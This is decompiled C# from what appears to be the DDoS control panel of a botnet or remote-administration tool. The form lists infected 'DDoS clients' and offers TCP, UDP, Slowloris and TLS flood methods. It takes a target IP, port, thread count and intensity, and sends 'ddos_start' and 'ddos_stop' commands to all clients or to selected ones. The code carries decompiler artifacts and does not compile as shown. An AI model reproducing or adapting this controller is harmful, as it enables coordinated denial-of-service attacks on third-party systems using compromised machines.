					this.vmethod_38().Invoke(new fDDOS.Delegate70(this.method_1), new object[]
					{
						string_0,
						string_1
					});
					return;
				}
				try
				{
					string left = string_1[8];
					if (Operators.CompareString(left, Conversions.ToString(0), true) == 0)
					{
						string_1[8] = "Maximum";
					}
					else if (Operators.CompareString(left, Conversions.ToString(1), true) == 0)
					{
						string_1[8] = "High";
					}
					else if (Operators.CompareString(left, Conversions.ToString(2), true) == 0)
					{
						string_1[8] = "Above normal";
					}
					else if (Operators.CompareString(left, Conversions.ToString(3), true) == 0)
					{
						string_1[8] = "Normal";
					}
					else if (Operators.CompareString(left, Conversions.ToString(4), true) == 0)
					{
						string_1[8] = "Below normal";
					}
					else if (Operators.CompareString(left, Conversions.ToString(5), true) == 0)
					{
						string_1[8] = "Low";
					}
					else if (Operators.CompareString(left, Conversions.ToString(6), true) == 0)
					{
						string_1[8] = "Minimum";
					}
					Class130.concurrentDictionary_5[string_0].idxValues[0] = Class130.concurrentDictionary_3[string_0].sUser;
					Class130.concurrentDictionary_5[string_0].idxValues[1] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[0], string.Empty, true) == 0, "N/A", string_1[0]));
					Class130.concurrentDictionary_5[string_0].idxValues[2] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[1], string.Empty, true) == 0, "N/A", string_1[1]));
					Class130.concurrentDictionary_5[string_0].idxValues[3] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[2], string.Empty, true) == 0, "N/A", string_1[2]));
					Class130.concurrentDictionary_5[string_0].idxValues[4] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[3], string.Empty, true) == 0, "N/A", string_1[3]));
					Class130.concurrentDictionary_5[string_0].idxValues[5] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[4], string.Empty, true) == 0, "N/A", string_1[4]));
					string[] idxValues = Class130.concurrentDictionary_5[string_0].idxValues;
					int num = 6;
					int num2 = (Operators.CompareString(string_1[5], string.Empty, true) == 0) ? 1 : 0;
					string text = "N/A";
					double num3 = Conversion.Val(string_1[5]);
					bool flag = false;
					ref bool ptr = ref flag;
					double num4 = num3;
					string truePart = text;
					int expression = num2;
					int num5 = num;
					string[] array = idxValues;
					int num6;
					string text3;
					int num7;
					object obj;
					try
					{
						ProjectData.ClearProjectError();
						num6 = 2;
						string text2 = string.Empty;
						if (num4 >= 1099511627776.0)
						{
							text2 = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num4 >= 1073741824.0)
						{
							text2 = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num4 >= 1048576.0)
						{
							text2 = Strings.Format(num4 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num4 >= 1024.0)
						{
							text2 = Strings.Format(num4 / 1024.0, "#0.00") + " KiB";
						}
						else if (num4 < 1024.0)
						{
							text2 = Conversions.ToString(Conversion.Fix(num4)) + " B";
						}
						if (ptr)
						{
							text2 = Strings.Split(text2, " ", -1, CompareMethod.Text)[0];
						}
						if (text2.Length > 0)
						{
							text3 = text2;
						}
						else
						{
							text3 = " 0 B";
						}
						IL_3D2:
						goto IL_422;
						IL_3D4:
						text3 = "0 B";
						goto IL_3D2;
						IL_3DD:
						num7 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num6);
						IL_3F3:;
					}
					catch when (endfilter(obj is Exception & num6 != 0 & num7 == 0))
					{
						Exception ex = (Exception)obj2;
						goto IL_3DD;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_422:
					if (num7 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string falsePart = text3;
					array[num5] = Conversions.ToString(Interaction.IIf(expression != 0, truePart, falsePart));
					string[] idxValues2 = Class130.concurrentDictionary_5[string_0].idxValues;
					int num8 = 7;
					int num9 = (Operators.CompareString(string_1[6], string.Empty, true) == 0) ? 1 : 0;
					string text4 = "N/A";
					double num10 = Conversion.Val(string_1[6]);
					flag = false;
					ptr = ref flag;
					num4 = num10;
					string truePart2 = text4;
					int expression2 = num9;
					int num11 = num8;
					string[] array2 = idxValues2;
					object obj3;
					try
					{
						ProjectData.ClearProjectError();
						num6 = 2;
						string text2 = string.Empty;
						if (num4 >= 1099511627776.0)
						{
							text2 = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num4 >= 1073741824.0)
						{
							text2 = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num4 >= 1048576.0)
						{
							text2 = Strings.Format(num4 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num4 >= 1024.0)
						{
							text2 = Strings.Format(num4 / 1024.0, "#0.00") + " KiB";
						}
						else if (num4 < 1024.0)
						{
							text2 = Conversions.ToString(Conversion.Fix(num4)) + " B";
						}
						if (ptr)
						{
							text2 = Strings.Split(text2, " ", -1, CompareMethod.Text)[0];
						}
						if (text2.Length > 0)
						{
							text3 = text2;
						}
						else
						{
							text3 = " 0 B";
						}
						IL_5F2:
						goto IL_642;
						IL_5F4:
						text3 = "0 B";
						goto IL_5F2;
						IL_5FD:
						num7 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num6);
						IL_613:;
					}
					catch when (endfilter(obj3 is Exception & num6 != 0 & num7 == 0))
					{
						Exception ex2 = (Exception)obj4;
						goto IL_5FD;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_642:
					if (num7 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string str = text3;
					array2[num11] = Conversions.ToString(Interaction.IIf(expression2 != 0, truePart2, str + "/s"));
					Class130.concurrentDictionary_5[string_0].idxValues[8] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[7], string.Empty, true) == 0, "N/A", Conversion.Val(string_1[7])));
					Class130.concurrentDictionary_5[string_0].idxValues[9] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[8], string.Empty, true) == 0, "N/A", string_1[8]));
					string[] idxValues3 = Class130.concurrentDictionary_5[string_0].idxValues;
					int num12 = 10;
					int num13 = (Operators.CompareString(string_1[9], string.Empty, true) == 0) ? 1 : 0;
					string text5 = "N/A";
					double num14 = Conversion.Val(string_1[9]);
					flag = false;
					ptr = ref flag;
					num4 = num14;
					string truePart3 = text5;
					int expression3 = num13;
					int num15 = num12;
					string[] array3 = idxValues3;
					object obj5;
					try
					{
						ProjectData.ClearProjectError();
						num6 = 2;
						string text2 = string.Empty;
						if (num4 >= 1099511627776.0)
						{
							text2 = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num4 >= 1073741824.0)
						{
							text2 = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num4 >= 1048576.0)
						{
							text2 = Strings.Format(num4 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num4 >= 1024.0)
						{
							text2 = Strings.Format(num4 / 1024.0, "#0.00") + " KiB";
						}
						else if (num4 < 1024.0)
						{
							text2 = Conversions.ToString(Conversion.Fix(num4)) + " B";
						}
						if (ptr)
						{
							text2 = Strings.Split(text2, " ", -1, CompareMethod.Text)[0];
						}
						if (text2.Length > 0)
						{
							text3 = text2;
						}
						else
						{
							text3 = " 0 B";
						}
						IL_894:
						goto IL_8E4;
						IL_896:
						text3 = "0 B";
						goto IL_894;
						IL_89F:
						num7 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num6);
						IL_8B5:;
					}
					catch when (endfilter(obj5 is Exception & num6 != 0 & num7 == 0))
					{
						Exception ex3 = (Exception)obj6;
						goto IL_89F;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_8E4:
					if (num7 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string falsePart2 = text3;
					array3[num15] = Conversions.ToString(Interaction.IIf(expression3 != 0, truePart3, falsePart2));
					Class130.concurrentDictionary_5[string_0].idxValues[11] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[10], string.Empty, true) == 0, "N/A", Class136.smethod_35((long)Math.Round(Conversion.Val(string_1[10])), true)));
					Class130.concurrentDictionary_5[string_0].idxValues[12] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[11], string.Empty, true) == 0, "N/A", string_1[11]));
					Class130.concurrentDictionary_5[string_0].bJustConnected = false;
					Class130.concurrentDictionary_5[string_0].sent_bytes = (long)Math.Round(Conversion.Val(string_1[5]));
					Class130.concurrentDictionary_5[string_0].speed_bytes = (long)Math.Round(Conversion.Val(string_1[6]));
					this.concurrentStack_1.Push(Class130.concurrentDictionary_5[string_0]);
					return;
				}
				catch (Exception ex4)
				{
					return;
				}
			}
			this.method_0(string_0, null);
			this.method_1(string_0, string_1);
		}
	}

	// Token: 0x06000DDF RID: 3551 RVA: 0x0006B2B0 File Offset: 0x000694B0
	public void method_2(string string_0)
	{
		if (Class130.concurrentDictionary_5.ContainsKey(string_0))
		{
			if (this.vmethod_38().InvokeRequired)
			{
				this.vmethod_38().Invoke(new fDDOS.Delegate68(this.method_2), new object[]
				{
					string_0
				});
				return;
			}
			try
			{
				this.concurrentStack_2.Push(Class130.concurrentDictionary_5[string_0]);
				ConcurrentDictionary<string, cDOScli> concurrentDictionary_ = Class130.concurrentDictionary_5;
				cDOScli cDOScli = null;
				concurrentDictionary_.TryRemove(string_0, out cDOScli);
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000DE0 RID: 3552 RVA: 0x0006B344 File Offset: 0x00069544
	public void method_3()
	{
		if (this.vmethod_38().InvokeRequired)
		{
			this.vmethod_38().Invoke(new fDDOS.Delegate65(this.method_3), new object[0]);
			return;
		}
		if (this.concurrentStack_0.Count > 0)
		{
			this.vmethod_38().AddObjects(this.concurrentStack_0.ToList<cDOScli>());
			this.concurrentStack_0.Clear();
		}
	}

	// Token: 0x06000DE1 RID: 3553 RVA: 0x0006B3AC File Offset: 0x000695AC
	public void method_4()
	{
		if (this.vmethod_38().InvokeRequired)
		{
			this.vmethod_38().Invoke(new fDDOS.Delegate67(this.method_4), new object[0]);
			return;
		}
		if (this.concurrentStack_1.Count > 0)
		{
			this.vmethod_38().RefreshObjects(this.concurrentStack_1.ToList<cDOScli>());
			this.concurrentStack_1.Clear();
		}
	}

	// Token: 0x06000DE2 RID: 3554 RVA: 0x0006B414 File Offset: 0x00069614
	public void method_5()
	{
		if (this.vmethod_38().InvokeRequired)
		{
			this.vmethod_38().Invoke(new fDDOS.Delegate66(this.method_5), new object[0]);
			return;
		}
		if (this.concurrentStack_2.Count > 0)
		{
			this.vmethod_38().RemoveObjects(this.concurrentStack_2.ToList<cDOScli>());
			this.concurrentStack_2.Clear();
		}
	}

	// Token: 0x06000DE3 RID: 3555 RVA: 0x0006B47C File Offset: 0x0006967C
	private void method_6(object sender, FormatRowEventArgs e)
	{
		try
		{
			cDOScli cDOScli = (cDOScli)e.Model;
			if (cDOScli.bJustConnected)
			{
				e.Item.BackColor = Color.LimeGreen;
			}
			else if (!cDOScli.pending_dc & !cDOScli.pending_dc_timeout)
			{
				e.Item.BackColor = Color.White;
			}
			else if (cDOScli.pending_dc & cDOScli.pending_dc_timeout)
			{
				e.Item.BackColor = Color.Yellow;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
			else if (cDOScli.pending_dc & !cDOScli.pending_dc_timeout)
			{
				e.Item.BackColor = Color.Red;
				if (e.Item.Focused)
				{
					e.ListView.DeselectAll();
				}
				e.Item.Selected = false;
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000DE4 RID: 3556 RVA: 0x0006B588 File Offset: 0x00069788
	private void method_7(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_38().Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x06000DE5 RID: 3557 RVA: 0x0000845E File Offset: 0x0000665E
	private void fDDOS_Load(object sender, EventArgs e)
	{
		this.method_8();
	}

	// Token: 0x06000DE6 RID: 3558 RVA: 0x0006B5F4 File Offset: 0x000697F4
	public void method_8()
	{
		base.Width = 1230;
		base.Height = 540;
		this.vmethod_38().VirtualMode = true;
		this.vmethod_38().View = View.Details;
		this.vmethod_38().FullRowSelect = true;
		this.vmethod_38().OwnerDraw = true;
		this.vmethod_38().Columns[0].Width = 180;
		this.vmethod_38().Columns[1].Width = 120;
		this.vmethod_38().Columns[2].Width = 60;
		this.vmethod_38().Columns[3].Width = 80;
		this.vmethod_38().Columns[4].Width = 60;
		this.vmethod_38().Columns[5].Width = 60;
		this.vmethod_38().Columns[6].Width = 80;
		this.vmethod_38().Columns[7].Width = 80;
		this.vmethod_38().Columns[8].Width = 80;
		this.vmethod_38().Columns[9].Width = 80;
		this.vmethod_38().Columns[10].Width = 80;
		this.vmethod_38().Columns[11].Width = 120;
		this.vmethod_38().Columns[12].Width = 120;
		this.vmethod_38().GridLines = Class135.smethod_0().Gridlines;
		this.vmethod_10().Items.Add("TCP Flood");
		this.vmethod_10().Items.Add("UDP Flood");
		this.vmethod_10().Items.Add("Slowloris");
		this.vmethod_10().Items.Add("TCP Keep-Alive");
		this.vmethod_10().Items.Add("TLS Handshake");
		this.vmethod_10().Items.Add("TLS Flood");
		this.vmethod_10().Items.Add("Custom");
		this.vmethod_10().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_10().Items[0]);
		int num = 1;
		checked
		{
			do
			{
				this.vmethod_6().Items.Add(num);
				num++;
			}
			while (num <= 1024);
			this.vmethod_6().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_6().Items[0]);
			this.vmethod_86().Items.Add("Maximum");
			this.vmethod_86().Items.Add("High");
			this.vmethod_86().Items.Add("Above normal");
			this.vmethod_86().Items.Add("Normal");
			this.vmethod_86().Items.Add("Below normal");
			this.vmethod_86().Items.Add("Low");
			this.vmethod_86().Items.Add("Minimum");
			this.vmethod_86().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_86().Items[1]);
			this.vmethod_76().Items.Add("TCP");
			this.vmethod_76().Items.Add("UDP");
			this.vmethod_76().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_76().Items[0]);
			this.vmethod_4().RunWorkerAsync();
		}
	}

	// Token: 0x06000DE7 RID: 3559 RVA: 0x00008466 File Offset: 0x00006666
	private void method_9(object sender, DoWorkEventArgs e)
	{
		for (;;)
		{
			this.method_3();
			this.method_4();
			this.method_5();
			Thread.Sleep(1000);
		}
	}

	// Token: 0x06000DE8 RID: 3560 RVA: 0x0006B9B0 File Offset: 0x00069BB0
	private void method_10(object sender, EventArgs e)
	{
		double num = 0.0;
		double num2 = 0.0;
		double num3 = 0.0;
		try
		{
			FastObjectListView fastObjectListView = this.vmethod_38();
			try
			{
				foreach (object obj in fastObjectListView.Objects)
				{
					cDOScli cDOScli = (cDOScli)obj;
					num += Conversion.Val(cDOScli.speed_bytes);
					num2 += Conversion.Val(cDOScli.PPS);
					num3 += Conversion.Val(cDOScli.THREADS);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			this.vmethod_30().Text = "DDoS clients: " + Conversions.ToString(this.vmethod_38().Items.Count);
			this.vmethod_106().Text = "Threads: " + Conversions.ToString(num3);
			ToolStripStatusLabel toolStripStatusLabel = this.vmethod_32();
			string text = "Speed: ";
			double num4 = num;
			bool flag = false;
			ref bool ptr = ref flag;
			double num5 = num4;
			string str = text;
			ToolStripStatusLabel toolStripStatusLabel2 = toolStripStatusLabel;
			int num6;
			string text3;
			int num7;
			object obj2;
			try
			{
				ProjectData.ClearProjectError();
				num6 = 2;
				string text2 = string.Empty;
				if (num5 >= 1099511627776.0)
				{
					text2 = Strings.Format(num5 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
				}
				else if (num5 >= 1073741824.0)
				{
					text2 = Strings.Format(num5 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
				}
				else if (num5 >= 1048576.0)
				{
					text2 = Strings.Format(num5 / 1024.0 / 1024.0, "#0.00") + " MiB";
				}
				else if (num5 >= 1024.0)
				{
					text2 = Strings.Format(num5 / 1024.0, "#0.00") + " KiB";
				}
				else if (num5 < 1024.0)
				{
					text2 = Conversions.ToString(Conversion.Fix(num5)) + " B";
				}
				if (ptr)
				{
					text2 = Strings.Split(text2, " ", -1, CompareMethod.Text)[0];
				}
				if (text2.Length > 0)
				{
					text3 = text2;
				}
				else
				{
					text3 = " 0 B";
				}
				IL_26F:
				goto IL_2BF;
				IL_271:
				text3 = "0 B";
				goto IL_26F;
				IL_27A:
				num7 = -1;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num6);
				IL_290:;
			}
			catch when (endfilter(obj2 is Exception & num6 != 0 & num7 == 0))
			{
				Exception ex = (Exception)obj3;
				goto IL_27A;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			IL_2BF:
			if (num7 != 0)
			{
				ProjectData.ClearProjectError();
			}
			string str2 = text3;
			toolStripStatusLabel2.Text = str + str2 + "/s";
			this.vmethod_34().Text = "PPS: " + Conversions.ToString(num2);
			this.vmethod_36().Text = "Selected clients: " + Conversions.ToString(Class130.fMain_0.vmethod_18().SelectedObjects.Count);
		}
		catch (Exception ex2)
		{
		}
	}

	// Token: 0x06000DE9 RID: 3561 RVA: 0x0006BD44 File Offset: 0x00069F44
	private void method_11(object sender, EventArgs e)
	{
		this.vmethod_94().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().SelectedIndex == 3 | this.vmethod_10().SelectedIndex == 4, false, true));
		this.vmethod_82().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().SelectedIndex == 3 | this.vmethod_10().SelectedIndex == 4, false, true));
		this.vmethod_76().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().SelectedIndex == checked(this.vmethod_10().Items.Count - 1), true, false));
	}

	// Token: 0x06000DEA RID: 3562 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_12(object sender, EventArgs e)
	{
	}

	// Token: 0x06000DEB RID: 3563 RVA: 0x00008485 File Offset: 0x00006685
	private void method_13(object sender, EventArgs e)
	{
		Interaction.MsgBox("Using too many threads in combination with a too large packet size and high intensity level may contribute to reduced of Internet connection speed, and even complete connection loss, on your client(s).\r\n\r\nNote: The output data rate is equivalent to threads * packet size, i.e. 4 threads with 4096 bytes of packet size = 16384 bytes output rate.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000DEC RID: 3564 RVA: 0x00008499 File Offset: 0x00006699
	private void method_14(object sender, EventArgs e)
	{
		Interaction.MsgBox("The level of intensity represents relative CPU and output data traffic limits.\r\nIt's recommended to use a moderate intensity level when possible in order to maintain stable performance on your clients(s).\r\n\r\nWarning: Use with caution! The highest intensity in combiation with a too large packet size and too many threads may contribute to reduced of Internet connection speed, and even complete connection loss, on your client(s).", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000DED RID: 3565 RVA: 0x0006BE10 File Offset: 0x0006A010
	private void method_15(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_18().Text, "Target IP or DNS", true) == 0)
		{
			this.vmethod_18().Text = string.Empty;
			this.vmethod_18().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_18().Font, FontStyle.Regular);
			this.vmethod_18().Font = font;
		}
	}

	// Token: 0x06000DEE RID: 3566 RVA: 0x0006BE74 File Offset: 0x0006A074
	private void method_16(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_18().Text, string.Empty, true) == 0)
		{
			this.vmethod_18().Text = "Target IP or DNS";
			this.vmethod_18().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_18().Font, FontStyle.Italic);
			this.vmethod_18().Font = font;
		}
	}

	// Token: 0x06000DEF RID: 3567 RVA: 0x0006BED8 File Offset: 0x0006A0D8
	private void method_17(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_14().Text) | Conversion.Val(this.vmethod_14().Text) < 1.0 | Conversion.Val(this.vmethod_14().Text) > 65535.0)
		{
			this.vmethod_14().BackColor = Color.Red;
			return;
		}
		this.vmethod_14().BackColor = Color.White;
	}

	// Token: 0x06000DF0 RID: 3568 RVA: 0x0006BF54 File Offset: 0x0006A154
	private void method_18(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_14().Text, "12345", true) == 0)
		{
			this.vmethod_14().Text = string.Empty;
			this.vmethod_14().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_14().Font, FontStyle.Regular);
			this.vmethod_14().Font = font;
		}
	}

	// Token: 0x06000DF1 RID: 3569 RVA: 0x0006BFB8 File Offset: 0x0006A1B8
	private void method_19(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_14().Text, string.Empty, true) == 0)
		{
			this.vmethod_14().Text = "12345";
			this.vmethod_14().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_14().Font, FontStyle.Italic);
			this.vmethod_14().Font = font;
		}
	}

	// Token: 0x06000DF2 RID: 3570 RVA: 0x0006C01C File Offset: 0x0006A21C
	private void method_20(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_82().Text, "/site.php?x=val1&y=val2", true) == 0)
		{
			this.vmethod_82().Text = string.Empty;
			this.vmethod_82().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_82().Font, FontStyle.Regular);
			this.vmethod_82().Font = font;
		}
	}

	// Token: 0x06000DF3 RID: 3571 RVA: 0x0006C080 File Offset: 0x0006A280
	private void method_21(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_82().Text, string.Empty, true) == 0)
		{
			this.vmethod_82().Text = "/site.php?x=val1&y=val2";
			this.vmethod_82().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_82().Font, FontStyle.Italic);
			this.vmethod_82().Font = font;
		}
	}

	// Token: 0x06000DF4 RID: 3572 RVA: 0x0006C0E4 File Offset: 0x0006A2E4
	private void method_22(object sender, EventArgs e)
	{
		string text = string.Empty;
		string text2 = string.Empty;
		string text3 = string.Empty;
		string text4 = string.Empty;
		string text5 = string.Empty;
		string text6 = string.Empty;
		string text7 = string.Empty;
		string s = string.Empty;
		if (this.vmethod_18().TextLength < 3 | Operators.CompareString(this.vmethod_18().Text, "Target IP or DNS", true) == 0)
		{
			Interaction.MsgBox("The target IP or DNS is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		if (!Versioned.IsNumeric(this.vmethod_14().Text) | Conversion.Val(this.vmethod_14().Text) < 0.0 | Conversion.Val(this.vmethod_14().Text) > 65535.0 | Operators.CompareString(this.vmethod_14().Text, "12345", true) == 0)
		{
			Interaction.MsgBox("The port is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		if (!Versioned.IsNumeric(this.vmethod_94().Text) | Conversion.Val(this.vmethod_94().Text) < 0.0 | (Conversion.Val(this.vmethod_94().Text) > 65535.0 & this.vmethod_10().SelectedIndex != 3))
		{
			Interaction.MsgBox("The size is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		if ((Conversion.Val(this.vmethod_94().Text) == 0.0 & this.vmethod_82().TextLength < 1) | (Operators.CompareString(this.vmethod_94().Text, "/site.php?x=val1&y=val2", true) == 0 & this.vmethod_10().SelectedIndex != 3))
		{
			Interaction.MsgBox("The data is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		if ((this.vmethod_10().SelectedIndex == 4 | this.vmethod_10().SelectedIndex == 5) && Conversion.Val(this.vmethod_6().SelectedItem.ToString()) > 512.0)
		{
			Interaction.MsgBox("Maximum allowed number of threads for TLS methods is 512.", MsgBoxStyle.Exclamation, Application.ProductName);
			this.vmethod_6().SelectedIndex = 511;
			return;
		}
		text = this.vmethod_6().SelectedItem.ToString();
		text2 = this.vmethod_18().Text;
		text3 = this.vmethod_14().Text;
		text6 = Conversions.ToString(this.vmethod_86().SelectedIndex);
		text7 = this.vmethod_94().Text;
		s = this.vmethod_82().Text;
		int selectedIndex = this.vmethod_76().SelectedIndex;
		if (selectedIndex != 0)
		{
			if (selectedIndex == 1)
			{
				text5 = "udp";
			}
		}
		else
		{
			text5 = "tcp";
		}
		switch (this.vmethod_10().SelectedIndex)
		{
		case 0:
			text4 = "tcp";
			break;
		case 1:
			text4 = "udp";
			break;
		case 2:
			text4 = "slo";
			break;
		case 3:
			text4 = "tka";
			break;
		case 4:
			text4 = "ths";
			break;
		case 5:
			text4 = "tlf";
			break;
		case 6:
			text4 = "cus";
			break;
		}
		FastObjectListView fastObjectListView = Class130.fMain_0.vmethod_18();
		if (this.vmethod_22().Checked)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					CClient cclient = (CClient)obj;
					cclient.DDOS_LAST_SETTINGS = string.Concat(new string[]
					{
						Convert.ToBase64String(Encoding.UTF8.GetBytes(text2.ToString().ToLower())),
						"|",
						text3,
						"|",
						text,
						"|",
						text4,
						"|",
						text5,
						"|",
						text6,
						"|",
						text7,
						"|",
						Convert.ToBase64String(Encoding.UTF8.GetBytes(s))
					});
					string sKey = cclient.sKey;
					string string_ = "ddos_start|" + cclient.DDOS_LAST_SETTINGS;
					string string_2 = sKey;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
				return;
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		try
		{
			foreach (object obj2 in fastObjectListView.Objects)
			{
				CClient cclient2 = (CClient)obj2;
				cclient2.DDOS_LAST_SETTINGS = string.Concat(new string[]
				{
					Convert.ToBase64String(Encoding.UTF8.GetBytes(text2.ToString().ToLower())),
					"|",
					text3,
					"|",
					text,
					"|",
					text4,
					"|",
					text5,
					"|",
					text6,
					"|",
					text7,
					"|",
					Convert.ToBase64String(Encoding.UTF8.GetBytes(s))
				});
				string sKey2 = cclient2.sKey;
				string string_ = "ddos_start|" + cclient2.DDOS_LAST_SETTINGS;
				string string_2 = sKey2;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = string_2;
				@class.string_1 = string_;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}
		finally
		{
			IEnumerator enumerator2;
			if (enumerator2 is IDisposable)
			{
				(enumerator2 as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x06000DF5 RID: 3573 RVA: 0x0006C748 File Offset: 0x0006A948
	private void method_23(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_94().Text) | Conversion.Val(this.vmethod_94().Text) < 0.0 | Conversion.Val(this.vmethod_94().Text) > 65535.0)
		{
			this.vmethod_94().Text = "0";
		}
		this.vmethod_82().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_94().TextLength == 0 | Operators.CompareString(this.vmethod_94().Text, "0", true) == 0, true, false));
	}

	// Token: 0x06000DF6 RID: 3574 RVA: 0x000084AD File Offset: 0x000066AD
	private void method_24(object sender, EventArgs e)
	{
		Interaction.MsgBox("Packets with random content of the given size will be used as output data.\r\nYou may also leave the value as 0 in order to use custom data instead.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000DF7 RID: 3575 RVA: 0x00007348 File Offset: 0x00005548
	private void fDDOS_Closing(object sender, CancelEventArgs e)
	{
		base.Visible = false;
		e.Cancel = true;
	}

	// Token: 0x06000DF8 RID: 3576 RVA: 0x0006C7FC File Offset: 0x0006A9FC
	private void method_25(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = Class130.fMain_0.vmethod_18();
		if (this.vmethod_22().Checked)
		{
			if (fastObjectListView.SelectedObjects == null)
			{
				return;
			}
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					string sKey = ((CClient)obj).sKey;
					string string_ = "ddos_stop|1";
					string string_2 = sKey;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
				return;
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		try
		{
			foreach (object obj2 in fastObjectListView.Objects)
			{
				string sKey2 = ((CClient)obj2).sKey;
				string string_ = "ddos_stop|1";
				string string_2 = sKey2;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = string_2;
				@class.string_1 = string_;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}
		finally
		{
			IEnumerator enumerator2;
			if (enumerator2 is IDisposable)
			{
